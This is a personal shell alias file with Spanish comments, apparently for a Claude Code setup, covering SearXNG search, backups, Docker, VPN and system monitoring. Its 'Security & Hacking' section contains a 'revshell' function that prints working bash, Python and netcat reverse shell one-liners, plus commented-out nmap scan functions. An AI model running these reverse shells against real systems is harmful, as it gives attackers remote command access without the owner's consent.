# Claude Code - Aliases Completos

# ============================================
# Búsqueda Web (SearXNG)
# ============================================
alias s='searxng-search'           # Búsqueda web general

# Búsquedas especializadas por motor
alias cve='s "!exploit-db"'        # Buscar CVEs/exploits
alias gh='s "!gh"'                 # Buscar en GitHub
alias so='s "!so"'                 # Stack Overflow
alias aw='s "!aw"'                 # Arch Wiki
alias w='s "!wp"'                  # Wikipedia
alias ddg='s "!ddg"'               # DuckDuckGo
alias go='s "!go"'                 # Google

# ============================================
# Claude Management
# ============================================
alias cs='claude-backup sync'      # Sync config a git
alias cc='claude-check'            # Verificar setup
alias cb='claude-backup'           # Backup general

# ============================================
# SearXNG Control
# ============================================
alias xs='systemctl --user start searxng.service'
alias xstop='systemctl --user stop searxng.service'
alias xr='systemctl --user restart searxng.service'
alias xstat='systemctl --user status searxng.service'
alias xl='docker logs -f searxng'

# ============================================
# Security & Hacking
# ============================================

# NOTE: These require nmap (install: sudo pacman -S nmap)
# Uncomment when nmap is installed:

# # Nmap quick scan
# nq() {
#     sudo nmap -sV -sC "$1"
# }

# # Full port scan
# portscan() {
#     sudo nmap -p- --min-rate=1000 -T4 "$1"
# }

# Reverse shell generator (ethical use only)
revshell() {
    local ip="${1:-127.0.0.1}" port="${2:-4444}"
    echo "Bash: bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo "NC: nc -e /bin/sh $ip $port"
}

# ============================================
# Docker
# ============================================
alias d='docker'
alias dlog='docker logs -f'
alias dex='docker exec -it'

# ============================================
# System Monitoring
# ============================================
alias cpu='ps aux | sort -nr -k 3 | head -10'
alias mem='ps aux | sort -nr -k 4 | head -10'
alias listening='sudo netstat -tulpn | grep LISTEN'

# ============================================
# ProtonVPN
# ============================================
alias vpnc='protonvpn connect'
alias vpnd='protonvpn disconnect'
alias vpni='protonvpn info'

# ============================================
# Quick Utils
# ============================================
alias j='jq .'                     # Pretty print JSON
alias b64='base64'                 # Encode base64
alias b64d='base64 -d'             # Decode base64
alias serve='python -m http.server 8000'  # HTTP server
